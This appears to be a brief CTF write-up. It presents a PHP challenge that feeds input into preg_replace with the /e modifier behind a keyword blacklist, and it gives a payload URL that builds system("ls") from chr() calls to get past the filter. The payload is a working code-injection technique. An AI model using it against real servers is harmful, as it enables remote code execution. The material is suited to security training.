---
title: preg_replace调用system(“ls“)
abbrlink: 64925
date: 2023-11-14 22:37:11
tags:
---

题目

```php
<?php
error_reporting(0);
if(isset($_GET['code']) && isset($_POST['pattern']))
{
    $pattern=$_POST['pattern'];
    if(!preg_match("/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\<|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&|\*|\%/i",$code))
    {
        $code=$_GET['code'];
        preg_replace('/(' . $pattern . ')/ei','print_r("\\1")', $code);
        echo "you are smart";
    }else{
        die("try again");
    }
}else{
    die("it is begin");
}
?>
```
payload：

```bash
http://112.6.51.212:31649/?code={${eval(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(34).chr(108).chr(115).chr(34).chr(41).chr(59))}}
```

